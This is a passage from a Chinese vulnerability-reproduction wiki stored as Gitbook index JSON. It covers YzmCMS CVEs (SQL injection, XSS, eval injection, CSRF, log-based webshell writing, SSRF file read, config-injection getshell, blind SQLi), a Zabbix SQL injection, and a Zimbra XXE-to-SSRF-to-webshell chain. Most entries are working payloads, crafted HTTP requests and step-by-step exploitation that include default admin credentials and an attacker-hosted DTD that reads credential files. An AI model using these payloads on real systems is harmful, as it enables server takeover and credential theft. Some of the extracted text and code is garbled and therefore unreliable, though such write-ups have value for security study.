1的条件，但返回的也还是结果中的第一个值，所以如果我们能把自己邮箱排到查询结果中的首位就可以从邮件中知晓所有账号的新密码了。 因为是利用新注册的账号来产生payload，很容易就可以想到payload为\\' or 1=1 order by id desc# 然后注册账号，重新登陆，直接上code访问，可以监控到mysql执行语句如下： 顺利收到新密码的邮件： image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:58 "},"Web安全/YzmCMS/（CVE-2018-19092）YzmCMS v5.2 xss漏洞/（CVE-2018-19092）YzmCMS v5.2 xss漏洞.html":{"url":"Web安全/YzmCMS/（CVE-2018-19092）YzmCMS v5.2 xss漏洞/（CVE-2018-19092）YzmCMS v5.2 xss漏洞.html","title":"（CVE-2018-19092）YzmCMS v5.2 xss漏洞","keywords":"","body":"（CVE-2018-19092）YzmCMS v5.2 xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html XSS payload: http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3e%3cscript%3ealert(1)%3c%2fscript%3er6qt2=1\\r6qt2=1) POC: GET /search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3e%3cscript%3ealert(1)%3c%2fscript%3er6qt2=1 HTTP/1.1 Host: www.0-sec.org Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://192.168.1.40/search/index/archives/pubtime/1526387722.html Cookie: PHPSESSID=u0bh5qnr84qsu9aa0oj8vpkuk Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:19 "},"Web安全/YzmCMS/（CVE-2018-7653）YzmCMS v3.6 xss漏洞/（CVE-2018-7653）YzmCMS v3.6 xss漏洞.html":{"url":"Web安全/YzmCMS/（CVE-2018-7653）YzmCMS v3.6 xss漏洞/（CVE-2018-7653）YzmCMS v3.6 xss漏洞.html","title":"（CVE-2018-7653）YzmCMS v3.6 xss漏洞","keywords":"","body":"（CVE-2018-7653）YzmCMS v3.6 xss漏洞 一、漏洞简介 YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS 3.6版本中存在跨站脚本漏洞。远程攻击者可借助'a'、'c'或'm'参数利用该漏洞注入任意的Web脚本或HTML。 二、漏洞影响 YzmCMS v3.6 三、复现过程 poc http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&modelid=1&q=tes http://www.0-sec.org/YzmCMS/index.php?m=search&c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&a=init&modelid=1&q=tes http://www.0-sec.org/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&c=index&a=init&modelid=1&q=tes http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=init&modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&q=tes 参考链接 https://www.anquanke.com/vul/id/1124944 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:17 "},"Web安全/YzmCMS/（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞/（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞.html":{"url":"Web安全/YzmCMS/（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞/（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞.html","title":"（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞","keywords":"","body":"（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞 一、漏洞简介 YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS 3.7.1版本中的yzmphp/core/function/global.func.php文件存在安全漏洞。远程攻击者可借助index.php?m=member&c=member_content&a=init请求的POST数据中的PHP代码利用该漏洞执行任意代码。 二、漏洞影响 YzmCMS v3.7.1 三、复现过程 首先，从网站后台登陆，/index.php?m=admin&c=index&a=init，然后选择模型管理，选 择模型 ID 为 1 的那个字段管理，然后添加字段，像下面这张图一样填表。 YzmCMSv3.7.1Eval注入漏洞/media/rId24.png) 接着需要拦截数据包，像图片一样， 修改 fieldtype 为 datetime，修改 datesest 为 array(1);@eval($_POST[wushuang]) YzmCMSv3.7.1Eval注入漏洞/media/rId25.png) 接着我们需要一个用户可以触发这个漏洞，选择会员管理，选择会员管理，添加用户， 填表如下。 YzmCMSv3.7.1Eval注入漏洞/media/rId26.png) 现 在 我 们 已 经 完 成 了 准 备 工 作 ， 接 着 以 用 户 身 份 登 陆 ， guici/123456,/index.php?m=member&c=index&a=login，点击在线投稿，接着你就可以执行任 意代码通过输入 post 数据 wushuang！/index.php?m=member&c=member_content&a=init YzmCMSv3.7.1Eval注入漏洞/media/rId27.png) 参考链接 https://github.com/guiciwushuang/yzmcms/blob/master/yzmcms_eval_injection_chinese.pdf Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:17 "},"Web安全/YzmCMS/YzmCMS v3.6 csrf/YzmCMS v3.6 csrf.html":{"url":"Web安全/YzmCMS/YzmCMS v3.6 csrf/YzmCMS v3.6 csrf.html","title":"YzmCMS v3.6 csrf","keywords":"","body":"YzmCMS v3.6 csrf 一、漏洞简介 二、漏洞影响 YzmCMS v3.6 三、复现过程 1、文件位置: /application/admin/controller/sql.class.php第10-42行中： public function init() { if(isset($_POST['sqlstr'])){ if(!C('sql_execute')) showmsg('根据系统配置，不允许在线执行SQL命令！', 'stop'); $sqlstr = MAGIC_QUOTES_GPC ? stripslashes($_POST['sqlstr']) : $_POST['sqlstr']; $sqlstr = rtrim(trim($sqlstr), ';'); $sqls = $_POST['action']=='many' ? explode(';', $sqlstr) : array(0 => $sqlstr); $admin = D('admin'); foreach($sqls as $sql){ 10. if(stristr($sql, 'outfile')){ 11. $str = 'ERROR : 检测到非法字符 “outfile”！'; 12. break; 13. } 14. if(stristr($sql, '.php')){ 15. $str = 'ERROR : 检测到非法字符 “.php” ！'; 16. break; 17. } 18. if(preg_match(\"/^drop(.*)database/i\", $sql)){ 19. $str = 'ERROR : 不允许删除数据库！'; 20. break; 21. } 22. $result = $admin->query($sql); 23. if($result){ 24. $str = 'OK : 执行成功！'; 25. if(is_object($result) || is_resource($result)){ 26. $arr = $admin->fetch_all($result); 27. } 28. }else{ 29. $str = 'ERROR : 执行失败！'; 30. break; 31. } 32. } 33. } 这段函数中对提交的sql参数进行还原处理，然后进行非法字符检测，检测字符是否存在\"oufile\"、\".php\",匹配是否有删除数据的操作等。 2、如何绕过这种限制？ 首页，outfile被禁止，第一时间想到的就是SQL语句利用日志写入文件，但是写入脚本文件\".php\"会被检测到非法字符；然后，尝试MySQL中concat函数来连接字符串，拆分'.php'关键词，如 CONCAT(\\\"test.\\\",\\\"php\\\");最后构造出可以写入文件，绕过非法字符检测的的SQL语句，从而触发代码执行漏洞，控制服务器。 Payload： show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file =CONCAT(\"E:\\\\study\\\\WWW\\\\YzmCMS\\\\test.\",\"php\"); select ''; #写入shell 漏洞复现 如何获取后台管理员权限 有两种思路： 思路A：通过默认信息，弱口令登录 默认后台路径：http://www.0-sec.org/admin/index/login.html 管理员默认账号密码均为：yzmcms 思路B：通过CSRF漏洞，诱导管理员访问，自动在后台添加管理员账号。 CSRF漏洞利用代码如下： OWASP CRSFTester Demonstration var pauses = new Array( \"68\" ); function pausecomp(millis) { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date OWASP CRSFTester Demonstration Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:02 "},"Web安全/YzmCMS/YzmCMS v3.6 远程命令执行/YzmCMS v3.6 远程命令执行.html":{"url":"Web安全/YzmCMS/YzmCMS v3.6 远程命令执行/YzmCMS v3.6 远程命令执行.html","title":"YzmCMS v3.6 远程命令执行","keywords":"","body":"YzmCMS v3.6 远程命令执行 一、漏洞简介 二、漏洞影响 YzmCMS v3.6 三、复现过程 Payload： show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file =CONCAT(\"E:\\\\study\\\\WWW\\\\YzmCMS\\\\test.\",\"php\"); select ''; #写入shell 1、执行sql语句，查看mysql日志配置情况 2、根据日志文件位置或者默认站点路径来推测站点目录，可用load_file()函数来测试，确认站点目录位置。或者通过phpinfo()等信息收集获取站点目录。 3、分别执行下列sql语句，将脚本代码写入文件： set global general_log = on; set global general_log_file =CONCAT(\"E:\\\\study\\\\WWW\\\\YzmCMS\\\\test.\",\"php\"); select ''; 4、提交参数，执行脚本代码： image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:03 "},"Web安全/YzmCMS/YzmCMS V5.3 后台ssrf/YzmCMS V5.3 后台ssrf .html":{"url":"Web安全/YzmCMS/YzmCMS V5.3 后台ssrf/YzmCMS V5.3 后台ssrf .html","title":"YzmCMS V5.3 后台ssrf ","keywords":"","body":"YzmCMS V5.3 后台ssrf 一、漏洞简介 二、漏洞影响 YzmCMS V5.3 三、复现过程 漏洞分析 漏洞位于 application\\collection\\controller\\collection_content.class.php 中的 collection_test 函数，此函数为获取一个网页中的URL，并获取此URL的值输出。类似于爬虫，爬取网页中URL对应的文章。以下为主要功能函数：　 首先查看 get_content()函数： 可以看到传进来的URL不进过任何检测规则就带入 file_get_content()函数，那么倘若此 $url 为 file:// 伪协议的话，如此则产生任意文件读取漏洞。那么此时回头看 $url的值是否可控。 可以看到，$url 的值来自于 collection_node 表中的 urlpage 字段的值。如果要 $url 可控，那么就要找到一个数据库写入操作，并且urlpage 字段的值可控。再看 此函数则是将$_POST的数据写入到表中。看 insert 函数如何写。 可以看到在写入过程中经过过滤函数 safe_data() ： 假设payload为：file://C:/Windows/System32/drivers/etc/hosts 可以看到此过滤函数对此payload并无任何影响，所以导致插入数据库中的urlpage字段的值可控，由此导致$url的值可控。再往下查看 get_sub_content()函数： 可以看到此函数是将 $html 中的 $start 和 $end 之间的值取出来，而 $start 表示区间开始的html表示，$end 表示区间结束的html标识。并且这两个标识不能为空。于是可以构造payload为：file://C:/Windows/System32/drivers/etc/hosts，如此进过上述函数则会取出payload并返回。再往下： 进入get_all_url()函数： public static function get_all_url($html, $url_contain='', $url_except='') { $html = str_replace(array(\"\\r\", \"\\n\"), '', $html); $html = str_replace(array(\"\", \"\"), \"\\n\", $html); preg_match_all('/]*)>([^\\/a>].*)/i', $html, $out); $data = array(); foreach ($out[1] as $k=>$v) { if (preg_match('/href=[\\'\"]?([^\\'\" ]*)[\\'\"]?/i', $v, $match_out)) { if ($url_contain) { if (strpos($match_out[1], $url_contain) === false) { continue; } } if ($url_except) { if (strpos($match_out[1], $url_except) !== false) { continue; } } $url2 = $match_out[1]; $url2 = self::url_check($url2, self::$url); $title = strip_tags($out[2][$k]); if(empty($url2) || empty($title)) continue; $data['url'][$k] = $url2; $data['title'][$k] = $title; } else { continue; } } 发现其中有一个正则过滤： preg_match_all(\\'/])>(^\\/a>^.)\\/i\\', $html, $out); ，此正则获取(value)括号中的值，并将其合并为一个数组。再往下看，又出现一个正则过滤： preg_match(\\'/href=[\\\\'\\\"]?(^\\\\'\\\"^ *)[\\\\'\\\"]?/i\\', $v, $match_out) ，此规则为href=\\\"(value)\\\"，并获取括号中value的值给$match_out，那么此时我们的payload需更改为： test 此时在往下看，有一个url_check函数： 可以看到会检测最后取出payload的值中是否有 :// ，巧的是我们的payload正好符合，所以该检测函数并未对payload造成影响。再往下回到最初的函数中： 至此，$articleurl 的值为我们最后的payload： file://C:/Windows/System32/drivers/etc/hosts ，直至此时，$article 的值为读取到的本地任意文件的内容，再往下看 get_filter_html()函数： $data``[``'content'``] = self::replace_item(self::get_sub_content(``$html``, ``$config``[``'content_rule'``][0], ``$config``[``'content_rule'``][1]), ``$config``[``'content_html_rule'``]); ``return` `$data``; 由于篇幅限制，只拿出影响读取内容的代码，其实这段代码对结果并无影响，有兴趣自己下来阅读。在往下看到： admin_tpl()函数为加载模板的函数，此模板位于：application\\collection\\view\\collection_test.html 此处只截出影响此漏洞的代码。此处可以看到，将读取出的任意文件内容显示出来，到此则漏洞分析完毕。 漏洞复现 操作系统：windows 7 php版本：5.5.38 + Apache mysql版本：5.5.53 首先登陆后台，进入 模块管理--->采集管理 添加节点 此处网站配置框中，可以在自己的vps服务器中搭建一个html网页，其内容为payload： 123 获取网站中的区域开始html为，区域结束的HTML为。点击保存。 再次点击测试采集，则读取payload中的hosts文件。 复现成功。 参考链接 https://www.cnblogs.com/Spec/p/11188198.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:04 "},"Web安全/YzmCMS/YzmCMS V5.4 后台getshell（一）/YzmCMS V5.4 后台getshell（一） .html":{"url":"Web安全/YzmCMS/YzmCMS V5.4 后台getshell（一）/YzmCMS V5.4 后台getshell（一） .html","title":"YzmCMS V5.4 后台getshell（一） ","keywords":"","body":"YzmCMS V5.4 后台getshell（一） 一、漏洞简介 二、漏洞影响 YzmCMS V5.4 三、复现过程 漏洞分析 发现的第一个问题出现在缓存文件写入函数处，文件为yzmphp/core/class/cache_file.class.php，函数名为_fileputcontents /media/rId25.png) 可以看到，补丁在原先的$contents前拼接了一段\\n，而如果要进入序列化的代码，需要$this->config['mode']为1，然后就是正常的写入文件。 调用这个函数的是同类下的set函数 public function set($id, $data, $cachelife = 0){ $cache = array(); $cache['contents'] = $data; $cache['expire'] = $cachelife === 0 ? 0 : SYS_TIME + $cachelife; $cache['mtime'] = SYS_TIME; if(!is_dir($this->config['cache_dir'])) { @mkdir($this->config['cache_dir'], 0777, true); } $file = $this->_file($id); return $this->_fileputcontents($file, $cache); } 而这个类cache_file在cache_factory中被实例化。 在文件yzmphp/core/class/cache_factory.class.php中可以看到 public static function get_instance() { if(self::$instances==null){ self::$instances = new self(); switch(C('cache_type')) { case 'file' : yzm_base::load_sys_class('cache_file','',0); self::$class = 'cache_file'; self::$config = C('file_config'); break; case 'redis' : yzm_base::load_sys_class('cache_redis','',0); self::$class = 'cache_redis'; self::$config = C('redis_config'); break; case 'memcache' : yzm_base::load_sys_class('cache_memcache','',0); self::$class = 'cache_memcache'; self::$config = C('memcache_config'); break; default : yzm_base::load_sys_class('cache_file','',0); self::$class = 'cache_file'; self::$config = C('file_config'); } } return self::$instances; } 这三个类提供了相同的功能，使用者可以通过配置来选择其中的某一个类，默认配置下便是cache_file类。 而系统中通过cache_factory类来实例化缓存类的函数是在yzmphp/core/function/global.func.php中的setcache function setcache($name, $data, $timeout=0) { yzm_base::load_sys_class('cache_factory','',0); $cache = cache_factory::get_instance()->get_cache_instances(); return $cache->set($name, $data, $timeout); } 所以传给setcache的第一个参数将作为文件名的一部分(后缀为php)，第二个参数将成为文件内容的一部分。缓存配置相同的情况下，文件名路径不变，只要传递的内容可控就可以写入代码从而getshell。 而对setcache的调用有多处，其中有一些是不能用的，因为会过滤尖括号，比如wechat和urlrule模块，最后我通过用户自定义配置成功写入代码。 在文件commom/function/system.func.php中有 function get_config($key = ''){ if(!$configs = getcache('configs')){ $data = D('config')->where(array('status'=>1))->select(); $configs = array(); foreach($data as $val){ $configs[$val['name']] = $val['value']; } setcache('configs', $configs); } if(!$key){ return $configs; }else{ return array_key_exists($key, $configs) ? $configs[$key] : ''; } } setcache的第二个参数是从数据库中config表读取的，因此找到一个写入该表的接口，再使得get_config函数被调用即可。调用get_config比较简单，因为这个函数是用于获取配置的，很多地方都用到了，只要刷新页面即可。所以重点是找到可用的写入接口。 在文件application/admin/controller/system_manage.class.php中就有一个可用的接口 public function user_config_add() { if(isset($_POST['dosubmit'])){ $config = D('config'); $res = $config->where(array('name' => $_POST['name']))->find(); if($res) return_json(array('status'=>0,'message'=>'配置名称已存在！')); if(empty($_POST['value'])) return_json(array('status'=>0,'message'=>'配置值不能为空！')); $_POST['type'] = 99; if(in_array($_POST['fieldtype'], array('select','radio'))){ $_POST['setting'] = array2string(explode('|', rtrim($_POST['setting'], '|'))); }else{ $_POST['setting'] = ''; } if($config->insert($_POST)){ delcache('configs'); return_json(array('status'=>1,'message'=>L('operation_success'))); }else{ return_json(array('status'=>0,'message'=>L('data_not_modified'))); } } include $this->admin_tpl('user_config_add'); } 可以看到post过来的值被直接insert到了config表(如果insert的第二个参数为true则会进行过滤)，所以这个接口就可以用于写入代码。 漏洞复现 因为安装以后的默认配置中的file_config的mode为2，所以在我们发现的第一个函数_fileputcontents中是不会进入序列化代码的阶段，在进行写入以前，我们需要手动修改配置文件common/config/config.php //缓存类型为file缓存时的配置项 'file_config' => array ( 'cache_dir' => YZMPHP_PATH.'cache/chche_file/', //缓存文件目录 'suffix' => '.cache.php', //缓存文件后缀 'mode' => '1', //缓存格式：mode 1 为serialize序列化, mode 2 为保存为可执行文件array ), 将该处的mode改为1保存即可 然后使用yzmcms/yzmcms登陆后台，来到系统管理的自定义配置处 /media/rId27.png) 然后添加配置，写入代码即可。 /media/rId28.png) /media/rId29.png) 添加以后去查看缓存文件夹cache/chche_file，可以看到configs.cache.php 直接在浏览器打开 /media/rId30.png) 参考链接 https://xz.aliyun.com/t/7231\\#toc-5 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:07 "},"Web安全/YzmCMS/YzmCMS V5.4 后台getshell（二）/YzmCMS V5.4 后台getshell（二）.html":{"url":"Web安全/YzmCMS/YzmCMS V5.4 后台getshell（二）/YzmCMS V5.4 后台getshell（二）.html","title":"YzmCMS V5.4 后台getshell（二）","keywords":"","body":"YzmCMS V5.4 后台getshell（二） 一、漏洞简介 二、漏洞影响 YzmCMS V5.4 三、复现过程 漏洞分析 这个cms中有一些配置项是写在文件中，也有一些是写在数据库中的，例如上一个漏洞提到的mode就是写在文件中，而我们的payload是写在数据库中再进行读取的，为了避免上面手动修改配置文件这一过程，我找到了一个函数可以修改配置文件，但是问题是只能对规定的4个key进行修改，所以是不能直接修改mode这个key的。于是我回去查看补丁，发现修改配置的函数也进行了修改。 /media/rId25.png) 该函数位于文件application/admin/common/function/function.php function set_config($config) { $configfile = YZMPHP_PATH.'common'.DIRECTORY_SEPARATOR.'config/config.php'; if(!is_writable($configfile)) showmsg('Please chmod '.$configfile.' to 0777 !', 'stop'); $pattern = $replacement = array(); foreach($config as $k=>$v) { $pattern[$k] = \"/'\".$k.\"'\\s*=>\\s*([']?)[^']*([']?)(\\s*),/is\"; $replacement[$k] = \"'\".$k.\"' => \\${1}\".$v.\"\\${2}\\${3},\"; } $str = file_get_contents($configfile); $str = preg_replace($pattern, $replacement, $str); return file_put_contents($configfile, $str, LOCK_EX); } 可以看到，补丁在原来的函数中增加了一行代码，将传入的$config中的字符,和$移除了，而原先就直接经过特定的正则表达式将config.php文件中的内容进行替换后再写回去。 调用这个函数的地方，除了安装的页面就只有application/admin/controller/system_manage.class.php中的save public function save() { yzm_base::load_common('function/function.php', 'admin'); if(isset($_POST['dosubmit'])){ if(isset($_POST['mail_inbox']) && $_POST['mail_inbox']){ if(!is_email($_POST['mail_inbox'])) showmsg(L('mail_format_error')); } if(isset($_POST['upload_types'])){ if(empty($_POST['upload_types'])) showmsg('允许上传附件类型不能为空！', 'stop'); } $arr = array(); $config = D('config'); foreach($_POST as $key => $value){ if(in_array($key, array('site_theme','watermark_enable','watermark_name','watermark_position'))) { $value = safe_replace(trim($value)); $arr[$key] = $value; }else{ if($key!='site_code'){ $value = htmlspecialchars($value); } } $config->update(array('value'=>$value), array('name'=>$key)); } set_config($arr); delcache('configs'); showmsg(L('operation_success'), '', 1); } } 在save中，只有key为'site_theme','watermark_enable','watermark_name','watermark_position'的配置项会经过safe_replace后传入set_config，其他项则是直接在数据库中更新。 safe_replace则对一些特殊字符进行了过滤 function safe_replace($string) { $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('\"','',$string); $string = str_replace(\"'\",'',$string); $string = str_replace(';','',$string); $string = str_replace('','>',$string); $string = str_replace(\"{\",'',$string); $string = str_replace('}','',$string); $string = str_replace('\\\\','',$string); return $string; } 审计完代码以后我们可以发现post过去的值，只有特定的key会被写入配置文件，而value不能包含safe_replace中的特殊字符，最后value会被拼接成为preg_replace中的第二个参数$replacement的一部分。而在$replacement中用了${1}这样的形式来指定上文匹配到的'，虽然{}被过滤了，但是$1实际上是与${1}等价的，因此我们通过这种方式闭合单引号，然后,也没有被过滤，所以我们可以在键值对的后面插入别的代码，可惜的是>是被过滤的，所以我们无法插入key => value这样的形式来修改项。不过可以直接插入函数，像array(0=>1,func())的形式中，func是会被执行的，并且将返回值作为value成为array的一部分。 所以只要闭合了单引号，再传递一个eval过去就可以执行代码了，因为有过滤函数，所以可以再套一层base64。 漏洞复现 设置的接口在系统管理的系统设置中的附加设置处。 /media/rId27.png) 通过上文的分析我们来构建payload。 将system('echo 123');base64_encode以后为c3lzdGVtKCdlY2hvIDEyMycpOw==，套一层eval并且闭合单引号后payload为 $1,eval(base64_decode($1c3lzdGVtKCdlY2hvIDEyMycpOw==$1)),$1 先查看配置文件原先的内容 /media/rId28.png) 回到页面，水印图片名称就是可用的一个配置项，在这个地方写入我们的payload并提交。 /media/rId29.png) 提交以后可以发现已经成功执行命令了 /media/rId30.png) 再回去查看配置文件可以看到代码也写入了 /media/rId31.png) 参考链接 https://xz.aliyun.com/t/7231\\#toc-5 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:09 "},"Web安全/YzmCMS/YzmCMS V5.7 用户模块时间盲注/YzmCMS V5.7 用户模块时间盲注.html":{"url":"Web安全/YzmCMS/YzmCMS V5.7 用户模块时间盲注/YzmCMS V5.7 用户模块时间盲注.html","title":"YzmCMS V5.7 用户模块时间盲注","keywords":"","body":"YzmCMS V5.7 用户模块时间盲注 一、漏洞简介 二、漏洞影响 YzmCMS V5.7 三、复现过程 application/member/controller/order.class.php:76行 这里直接拼接了where条件，type这里就有问题 构造url http://www.0-sec.org/member/order/order_search.html?of=id&or=DESC&dosubmit=1&&t_type=sleep(1) 调试跟一下可以看到如果传入的是数组会手动拆分进行预编译处理，但是我们这里是str 不是数组 所以就直接跳过处理 直接带入数据库，完成sleep 看了下语句发现这里利用的时候有一个小问题，首先这里是查数据数，在该表没数据的情况下是不会sleep的，所以要先在yzm_order中插入一条数据。 SELECT COUNT(*) AS total FROM `yzmcms` . `yzm_order` WHERE 1=1 AND `type` = sleep(1); 使用在线充值，会产生一条订单的数据 在没有配置支付的情况下会报错，但是这个订单是创建了。 这样就可以执行sleep了 时间注入 参考链接 https://xz.aliyun.com/t/7985\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:14 "},"Web安全/Zabbix/（CVE-2016-10134）Zabbix latest.php sql注入漏洞/（CVE-2016-10134）Zabbix latest.php sql注入漏洞.html":{"url":"Web安全/Zabbix/（CVE-2016-10134）Zabbix latest.php sql注入漏洞/（CVE-2016-10134）Zabbix latest.php sql注入漏洞.html","title":"（CVE-2016-10134）Zabbix latest.php sql注入漏洞","keywords":"","body":"（CVE-2016-10134）Zabbix latest.php sql注入漏洞 一、漏洞简介 Zabbix2.2.14之前的版本和3.0.4之前的3.0版本中存在SQL注入漏洞。远程攻击者可借助latest.php文件中的toggle_ids数组参数利用该漏洞执行任意SQL命令。 二、漏洞影响 Zabbix2.2.14之前的版本和3.0.4之前的3.0版本 三、复现过程 访问http://www.0-sec.org:8080，用账号guest（密码为空）登录游客账户。 登录后，查看Cookie中的zbx_sessionid，复制后16位字符： Zabbixlatest.phpsql注入漏洞/media/rId24.png) 将这16个字符作为sid的值，访问http://www.0-sec.org:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)，可见成功注入： Zabbixlatest.phpsql注入漏洞/media/rId25.png) 这个漏洞也可以通过jsrpc.php触发，且无需登录：http://www.0-sec.org:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)： Zabbixlatest.phpsql注入漏洞/media/rId26.png) 参考链接 https://vulhub.org/\\#/environments/zabbix/CVE-2016-10134/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:19 "},"Web安全/Zimbra/（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞/（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞.html":{"url":"Web安全/Zimbra/（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞/（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞.html","title":"（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞","keywords":"","body":"（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞 一、漏洞简介 当 Zimbra 存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071 admin 端口进行 SOAP AuthRequest 认证，得到 admin authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken 后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。不过由于Zimbra在单服务器安装中尽管Memcached虽然启动但是并没有进行使用，所以其攻击场景受到限制。 二、漏洞影响 ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说： Zimbra \\ Zimbra \\ 三、复现过程 第一步：检测是否存在xxe漏洞 POST /Autodiscover/Autodiscover.xml HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 Accept-Encoding: gzip, deflate Referer: https://mail.****.com/zimbra/ Content-Type: application/soap+xml Content-Length: 436 Connection: close Cookie: ZM_TEST=true Upgrade-Insecure-Requests: 1 ]> aaaaa &xxe; (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId25.png) 第二步：读取zimbra用户账号密码 dtd文件内容如下： \"> \"> POST请求包如下： POST /Autodiscover/Autodiscover.xml HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 Accept-Encoding: gzip, deflate Referer: https://mail.****.com/zimbra/ Content-Type: application/soap+xml Content-Length: 436 Connection: close Cookie: ZM_TEST=true Upgrade-Insecure-Requests: 1 %dtd; %all; ]> aaaaa &fileContents; (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId27.png) 这里利用了CVE-2019-9670漏洞来读取配置文件，你需要在自己的VPS服务器上放置一个dtd文件，并使该文件能够通过HTTP访问。为了演示，我在GitHub上创建了一个仓库，从GitHub上获取dtd文件。 上图中用红框圈起来的就是zimbra账号的密码 第三步：获取低权限token POST请求包如下： POST /service/soap HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 Accept-Encoding: gzip, deflate Referer: https://mail.****.com/zimbra/ Content-Type: application/soap+xml Content-Length: 467 Connection: close Cookie: ZM_TEST=true Upgrade-Insecure-Requests: 1 zimbra 上面得到的密码 (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId29.png) 从上图可以看到已经获取到token，但该token不是管理员权限的token，暂时记下来以后要用。 第四步：利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token POST请求包如下： POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1 Host: www.0-sec.org:7071 User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2 Accept-Encoding: gzip, deflate Referer: https://mail.****.com/zimbra/ Content-Type: application/soap+xml Content-Length: 465 Connection: close Cookie: ZM_ADMIN_AUTH_TOKEN=0_5221766f264e4dcb78b4f67be5f839b1ed668da3_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535343733303133353638333b747970653d363a7a696d6272613b7469643d393a3735353034333637323b Upgrade-Insecure-Requests: 1 zimbra GzXaU76_s5 (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId31.png) Cookie中设置Key为ZM_ADMIN_AUTH_TOKEN，值为上面请求所获取的token，将xmlns=\"urn:zimbraAccount\"修改为xmlns=\"urn:zimbraAdmin\"，在Host字段末尾添加\":7071\"，URL中的target要使用https协议。然后发送请求即可获得admin权限的token。 第五步：利用高权限token传文件getshell (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId33.png) 将上一步获取的admin权限token添加到cookie中，然后上传webshell。 Webshell路径为/downloads/k4x6p.jsp，访问该webshell时需要在cookie中添加admin_toke。 你可以利用此webshell在其他无需cookie即可访问的目录里创建一个可用菜刀连接的小马。 